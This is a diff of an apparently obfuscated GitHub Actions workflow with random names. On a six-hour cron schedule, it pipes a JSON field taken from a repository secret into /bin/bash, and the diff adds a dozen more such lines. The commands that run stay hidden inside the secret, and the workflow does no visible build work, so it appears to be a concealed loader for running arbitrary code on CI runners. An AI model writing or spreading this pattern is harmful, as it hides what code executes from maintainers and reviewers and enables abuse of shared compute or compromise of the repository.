@@ -1,9 +1,11 @@
 name: rigriggohk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
-jobs:  # 26277
+    - cron: '7 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,10 +13,19 @@ jobs:  # 26277
       - uses: actions/checkout@v4
       - name: rigriggohk
         env:
-          kbbjq74: ${{ secrets.kbbjq74 }}
+          a219: ${{ secrets.a219 }}
         run: |
-          echo $kbbjq74 | jq -r .tyrf012 | /bin/bash
-          echo $fp3046 | jq -r .nxu806 | /bin/bash
-          echo $kxaq20 | jq -r .mt3 | /bin/bash
-          echo $dj707 | jq -r .vicsa3 | /bin/bash
+          echo $a219 | jq -r .unlt97399 | /bin/bash
+          echo $iipg14 | jq -r .zhey960 | /bin/bash
+          echo $ejhov86 | jq -r .zsola1 | /bin/bash
+          echo $gng09509 | jq -r .tbea5744 | /bin/bash
+          echo $xwpf14598 | jq -r .pw7357 | /bin/bash
+          echo $d71211 | jq -r .mrxq53273 | /bin/bash
+          echo $bjqcj72 | jq -r .jxst19780 | /bin/bash
+          echo $jjlx92 | jq -r .sygk2070 | /bin/bash
+          echo $c0936 | jq -r .gkao50382 | /bin/bash
+          echo $i29 | jq -r .ap59 | /bin/bash
+          echo $o3335 | jq -r .uz58 | /bin/bash
+          echo $ftw57 | jq -r .nvwoj94756 | /bin/bash
+          echo $o9254 | jq -r .pklp25 | /bin/bash
 
